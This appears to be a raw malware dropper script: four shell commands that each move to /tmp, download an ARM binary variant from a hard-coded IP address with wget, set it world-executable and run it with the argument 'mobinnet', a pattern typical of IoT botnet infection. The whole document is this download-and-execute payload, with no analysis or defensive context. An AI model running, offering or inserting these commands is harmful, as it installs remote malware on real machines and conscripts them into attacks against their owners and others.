cd /tmp;wget http://45.95.146.126/splarm; chmod 777 splarm; ./splarm mobinnet
cd /tmp;wget http://45.95.146.126/splarm5; chmod 777 splarm5; ./splarm5 mobinnet
cd /tmp;wget http://45.95.146.126/splarm6; chmod 777 splarm6; ./splarm6 mobinnet
cd /tmp;wget http://45.95.146.126/splarm7; chmod 777 splarm7; ./splarm7 mobinnet
